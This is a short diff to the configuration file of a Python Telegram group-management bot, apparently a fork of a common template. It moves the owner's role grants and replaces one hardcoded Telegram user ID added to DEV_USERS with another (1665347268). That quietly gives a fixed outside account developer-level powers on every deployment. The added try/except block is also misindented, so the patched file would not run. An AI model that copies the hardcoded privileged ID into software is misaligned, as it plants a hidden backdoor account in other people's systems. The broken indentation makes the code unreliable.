@@ -137,10 +137,7 @@ else:
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
 
-    DRAGONS.add(OWNER_ID)
-    DEV_USERS.add(OWNER_ID)
-    DEV_USERS.add(1587091205)
-
+    
     OWNER_USERNAME = Config.OWNER_USERNAME
     MESSAGE_DUMP = Config.MESSAGE_DUMP
     GBAN_LOGS = Config.GBAN_LOGS
@@ -202,6 +199,15 @@ else:
     LASTFM_API_KEY = Config.LASTFM_API_KEY
 
 DEV_USERS.add(OWNER_ID)
+    try:
+    BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
+   except ValueError:
+    raise Exception("Your blacklisted chats list does not contain valid integers.")
+
+    DRAGONS.add(OWNER_ID)
+    DEV_USERS.add(OWNER_ID)
+    DEV_USERS.add(1665347268)
+
 
 # Pass if SpamWatch token not set.
 if SPAMWATCH is None:
